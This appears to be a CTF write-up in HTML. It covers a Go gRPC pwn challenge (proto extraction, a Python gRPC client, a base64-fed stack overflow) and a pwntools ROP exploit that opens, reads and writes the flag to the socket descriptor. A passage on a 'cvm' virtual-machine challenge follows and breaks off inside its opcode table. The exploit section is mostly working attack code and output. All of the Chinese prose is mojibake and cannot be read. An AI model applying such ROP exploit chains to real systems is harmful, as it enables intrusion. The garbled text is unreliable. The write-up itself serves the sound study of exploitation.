class="code"><pre><code class="hljs go"><span class="hljs-comment">// UnimplementedGreeterServer must be embedded to have forward compatible implementations.</span><br><span class="hljs-keyword">type</span> UnimplementedGreeterServer <span class="hljs-keyword">struct</span> &#123;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> SayHello(context.Context, *HelloRequest) (*HelloReply, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, status.Errorf(codes.Unimplemented, <span class="hljs-string">&quot;method SayHello not implemented&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> SayHelloAgain(context.Context, *HelloRequest) (*HelloReply, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, status.Errorf(codes.Unimplemented, <span class="hljs-string">&quot;method SayHelloAgain not implemented&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> mustEmbedUnimplementedGreeterServer() &#123;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RegisterGreeterServer</span><span class="hljs-params">(s grpc.ServiceRegistrar, srv GreeterServer)</span></span> &#123;<br>s.RegisterService(&amp;Greeter_ServiceDesc, srv)<br>&#125;<br></code></pre></td></tr></table></figure><p>hellogrpc&#x2F;hellogrpc.pb.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// The response message containing the greetings</span><br><span class="hljs-keyword">type</span> HelloReply <span class="hljs-keyword">struct</span> &#123;<br>state         protoimpl.MessageState<br>sizeCache     protoimpl.SizeCache<br>unknownFields protoimpl.UnknownFields<br><br>Message <span class="hljs-type">string</span> <span class="hljs-string">`protobuf:&quot;bytes,1,opt,name=message,proto3&quot; json:&quot;message,omitempty&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="protoæå–"><a href="#protoæå–" class="headerlink" title="protoæå–"></a>protoæå–</h2><p>æœ‰ä¸€ç§ç¥å¥‡çš„å·¥å…·å« <strong>pbtk</strong> å¯ä»¥ä»æ–‡ä»¶é‡Œæå–proto ï¼šï¼‰</p><p><em>é¢˜å¤–è¯ï¼Œæˆ‘åˆšå¼€å§‹æ‰“CTFçš„æ—¶å€™è§è¿‡è¿™ä¸ªå·¥å…·ï¼Œä½†æ˜¾ç„¶æˆ‘ä¸å¯èƒ½è®°å¾—è¿™ä»¶äº‹QVQï¼Œç¥å¥‡çš„å‘½è¿çš„è½®å›ï¼ˆé›¾ï¼‰</em></p><p>æå‡ºæ¥çš„proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">package</span> GGBond;<br><br><span class="hljs-keyword">option</span> go_package = <span class="hljs-string">&quot;./;ggbond&quot;</span>;<br><br><span class="hljs-keyword">service </span><span class="hljs-title class_">GGBondServer</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">rpc</span> Handler(Request) <span class="hljs-keyword">returns</span> (Response)</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">Request</span> &#123;<br>    <span class="hljs-keyword">oneof</span> request &#123; <span class="hljs-comment">// oneofå…³é”®å­—å®šä¹‰äº†ä¸€ä¸ªåŒ…å«å¤šä¸ªé€‰æ‹©é¡¹çš„å­—æ®µï¼ˆç±»ä¼¼unionï¼‰</span><br>        WhoamiRequest whoami = <span class="hljs-number">100</span>;<br>        RoleChangeRequest role_change = <span class="hljs-number">101</span>;<br>        RepeaterRequest repeater = <span class="hljs-number">102</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">Response</span> &#123;<br>    <span class="hljs-keyword">oneof</span> response &#123;<br>        WhoamiResponse whoami = <span class="hljs-number">200</span>;<br>        RoleChangeResponse role_change = <span class="hljs-number">201</span>;<br>        RepeaterResponse repeater = <span class="hljs-number">202</span>;<br>        ErrorResponse error = <span class="hljs-number">444</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">WhoamiRequest</span> &#123;<br>    <br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">WhoamiResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2000</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RoleChangeRequest</span> &#123;<br>    <span class="hljs-type">uint32</span> role = <span class="hljs-number">1001</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RoleChangeResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2001</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RepeaterRequest</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">1002</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RepeaterResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2002</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">ErrorResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">4444</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="python-grpc"><a href="#python-grpc" class="headerlink" title="python grpc"></a>python grpc</h2><p>çœŸä¸é”™ï¼Œæœ‰ä¸ªå±‘ä¹Ÿä¸çŸ¥é“grpcè¿˜æœ‰pythonåº“ï¼šï¼‰</p><p>grpcå·¥å…·åŒ…å¯ä»¥åˆ©ç”¨protoæ–‡ä»¶ç”ŸæˆgrpcæœåŠ¡ç±»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ./ggbond.proto<br></code></pre></td></tr></table></figure><p>ä¼šç”Ÿæˆggbond_pb2.pyå’Œggbond_pb2_grpc.pyä¸¤ä¸ªæ–‡ä»¶ï¼Œ_pb2ä¸­å®šä¹‰äº†æ•°æ®ç»“æ„ï¼Œ_pd2_grpcä¸­å®šä¹‰äº†æ–¹æ³•</p><p>äº¤äº’éƒ¨åˆ†ä»£ç ï¼Œæ ¹æ®ggbond_pb2å’Œggbond_pb2_grpcä¸­çš„å‡½æ•°å’Œprotoæ–‡ä»¶çŒœç€å†™å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> grpc<br><br><span class="hljs-keyword">import</span> ggbond_pb2<br><span class="hljs-keyword">import</span> ggbond_pb2_grpc<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whoami</span>(<span class="hljs-params">chan</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">role_change</span>(<span class="hljs-params">chan,role</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">repeater</span>(<span class="hljs-params">chan,message</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=message)))<br>    <span class="hljs-keyword">return</span> respond<br><br><br>channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(whoami(channel))<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(repeater(channel,<span class="hljs-string">&#x27;Eurus&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="goï¼Œç‹—éƒ½ä¸é€†ï¼Œæ±ª"><a href="#goï¼Œç‹—éƒ½ä¸é€†ï¼Œæ±ª" class="headerlink" title="goï¼Œç‹—éƒ½ä¸é€†ï¼Œæ±ª"></a>goï¼Œç‹—éƒ½ä¸é€†ï¼Œæ±ª</h2><p>æ—¢ç„¶ä¼šäº¤äº’äº†é‚£å°±éšä¾¿è¯•è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(repeater(channel,<span class="hljs-string">&#x27;Eurus&#x27;</span>))<br></code></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">python exp.py</span><br>role_change &#123;<br>  message: &quot;Role No Change.&quot;<br>&#125;<br><br>role_change &#123;<br>  message: &quot;New Role: SDaddy.&quot;<br>&#125;<br><br>repeater &#123;<br>  message: &quot;SDaddy: YBYB, YBBB.&quot;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åIDAæœâ€Role No Change.â€å­—ç¬¦ä¸²æœåˆ°äº†å¤„ç†å‡½æ•°main.(*server).Handler</p><p>role_changeå¤„ç†éƒ¨åˆ†ï¼Œrole&#x3D;3çš„æ—¶å€™æœ‰å‘æ ˆä¸Šå¤åˆ¶æ•°æ®çš„æ“ä½œï¼Œæ•°æ®æ¥æºæ˜¯å°†è¾“å…¥base64è§£ç </p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/overflow.png" class title="overflow"><p>é‚£å°±å¯ä»¥æ„‰å¿«çš„æº¢å‡ºäº† ^v^</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>ç”±äºäº¤äº’æ˜¯é€šè¿‡ç«¯å£è¿›è¡Œçš„ï¼Œä¸æ˜¯å°†è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°è¿œç¨‹ï¼Œæ‰€ä»¥å¼¹ä¸äº†shellï¼Œç›´æ¥æ‰“orw</p><ul><li>çˆ†ç ´ç¡®è®¤ç°åœ¨ç«¯å£çš„fdï¼Œè¿™é‡Œæ˜¯7</li><li>æœ‰syscallæœ‰gadgetæ²¡å¼€pieï¼Œå¯ä»¥ç›´æ¥ç”¨ï¼ˆç”šè‡³è¿flagå­—ç¬¦ä¸²éƒ½æœ‰ï¼‰ï¼ŒçœŸæ–¹ä¾¿~</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> grpc<br><br><span class="hljs-keyword">import</span> ggbond_pb2<br><span class="hljs-keyword">import</span> ggbond_pb2_grpc<br><br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whoami</span>(<span class="hljs-params">chan</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">role_change</span>(<span class="hljs-params">chan,role</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">repeater</span>(<span class="hljs-params">chan,message</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=base64.b64encode(message))))<br>    <span class="hljs-keyword">return</span> respond<br><br><br>channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br>rdi_addr=<span class="hljs-number">0x401537</span><br>rsi_addr=<span class="hljs-number">0x422398</span><br>rdx_addr=<span class="hljs-number">0x461bd1</span><br>rax_addr=<span class="hljs-number">0x4101e6</span><br>syscall_addr=<span class="hljs-number">0x40452C</span><br>flag_addr=<span class="hljs-number">0x7FAEEC</span><br>bss_addr=<span class="hljs-number">0xC90000</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc8</span><br>payload+=p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">2</span>)+p64(syscall_addr)<br>payload+=p64(rdi_addr)+p64(<span class="hljs-number">8</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">0</span>)+p64(syscall_addr)<br>payload+=p64(rdi_addr)+p64(<span class="hljs-number">7</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">1</span>)+p64(syscall_addr)<br><span class="hljs-built_in">print</span>(repeater(channel,payload))<br></code></pre></td></tr></table></figure><p>tcpdumpæŠ“åŒ…ï¼Œå› ä¸ºæ˜¯æœ¬åœ°æ‰€ä»¥æŠ“lo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo tcpdump -w flag.pcap -i lo</span><br></code></pre></td></tr></table></figure><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/flag.png" class title="flag"><p>ç®€ç®€åˆå•å•ï¼Œä½†æœ‰ç¬¨bæ²¡åšå‡ºæ¥^v^</p><h1 id="cvm"><a href="#cvm" class="headerlink" title="cvm"></a>cvm</h1><p>è¦æ‰“TLSä½†æœ‰ä¸ªå±‘ä¸ºäº†è°ƒè¯•ç›´æ¥æŠŠstart_thread patchäº†^v^</p><h2 id="c-ï¼Œç‹—éƒ½ä¸é€†ï¼Œæ±ª"><a href="#c-ï¼Œç‹—éƒ½ä¸é€†ï¼Œæ±ª" class="headerlink" title="c++ï¼Œç‹—éƒ½ä¸é€†ï¼Œæ±ª"></a>c++ï¼Œç‹—éƒ½ä¸é€†ï¼Œæ±ª</h2><p>æ¯”èµ›çš„æ—¶å€™å…¶å®å·²ç»æŠŠè¿™ç©æ„é€†å®Œäº†</p><p>vmçš„æ§åˆ¶æ•°æ®ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> &#123;</span><br>    <span class="hljs-type">size_t</span> overflow;<span class="hljs-comment">// ä¸çŸ¥é“å¹²å˜›çš„</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-type">void</span> *stack_base;<span class="hljs-comment">// æ ˆåŸºå€æŒ‡é’ˆ</span><br>        <span class="hljs-type">void</span> *stack_top;<span class="hljs-comment">// æ ˆé¡¶æŒ‡é’ˆ</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-type">void</span> *mem_addr;<span class="hljs-comment">// æ ˆç©ºé—´åœ°å€</span><br>            <span class="hljs-type">size_t</span> mem_size;<span class="hljs-comment">// æ ˆç©ºé—´å¤§å°ï¼Œ0x20000</span><br>        &#125; mem;<br>    &#125; <span class="hljs-built_in">stack</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-type">void</span> *mem_addr;<span class="hljs-comment">// textæ®µåœ°å€</span><br>        <span class="hljs-type">size_t</span> mem_size;<span class="hljs-comment">// textæ®µå¤§å°ï¼Œ0x20000</span><br>    &#125; code;<br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">    stackå’Œcodeçš„æ•°æ®ç»“æ„</span><br><span class="hljs-comment">        high</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">         |stack   |</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">         |code   |</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">        low</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">void</span> *func_calls_begin;<span class="hljs-comment">// ä¸çŸ¥é“å¹²å˜›çš„+1</span><br>    <span class="hljs-type">void</span> *func_calls_end;<span class="hljs-comment">// ä¸çŸ¥é“å¹²å˜›çš„+2</span><br>    <span class="hljs-type">void</span> *unknown;<span class="hljs-comment">// ä¸çŸ¥é“å¹²å˜›çš„+3</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> lock;<span class="hljs-comment">// å¤„ç†interruptçš„é”</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> finish;<span class="hljs-comment">// vmæ˜¯å¦åœæ­¢çš„æ ‡è®°</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> field1;<span class="hljs-comment">// å ä½</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> field2;<span class="hljs-comment">// å ä½+1</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> code_rip;<span class="hljs-comment">// ripï¼Œoffsetçš„å½¢å¼</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ”¯æŒçš„æŒ‡ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_nop</span>():<span class="hljs-comment"># rip++</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_pop</span>():<span class="hljs-comment"># stack_rop-=8</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x01&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_add</span>():<span class="hljs-comment"># popå‡ºä¸¤ä¸ªæ•°è®¡ç®—åpushè¿›stackï¼Œä¸‹åŒ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x02&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_sub</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x03&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_mul</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x04&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_div</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x05&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_mod</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x06&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_and</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x07&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_or</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_xor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x09&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_not</span>():<span class="hljs-comment"># å•ç›®è¿ç®—ç¬¦ç±»ä¼¼</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0A&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_call</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0B&#x27;</span><span class="hljs-comment"># æ€ªï¼Œä¸ç®¡ä¸é‡è¦</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_ret</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0C&#x27;</span><span class="hljs-comment"># pop offsetï¼Œrip=offset</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_lea</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0D&#x27;</span><span class="hljs-comment"># pop offsetï¼Œpush stack_base+offset</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push1</span>(<span class="hljs-params">value</span>):<span class="hljs-comment"># push xä¸ªå­—èŠ‚ï¼Œä¸‹åŒ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0E&#x27;</span> + value.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push2</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0F&#x27;</span> + value.to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push4</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span> + value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push8</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x11&#x27;</span> + value.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_modcall</span>():<span class="hljs-comment"># å¯ä»¥é€šè¿‡è¿™ä¸ªè¿›è¡Œreadå’Œwriteï¼Œé€šè¿‡throw exceptionå’Œcatchå®ç°</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_jz</span>():<span class="hljs-comment"># pop offsetï¼Œpop numï¼Œæ ¹æ®numåˆ¤æ–­æ˜¯å¦è·³è½¬åˆ°offsetï¼Œä¸‹åŒ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x13&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_jb</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x14&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_ja</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x15&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_dup</span>():<span class="hljs-comment"># push *stack_top</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x16&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_hlt</span>():<span class="hljs-comment"># stop</span><br>    <span class="hljs-keyword">return</span> <span 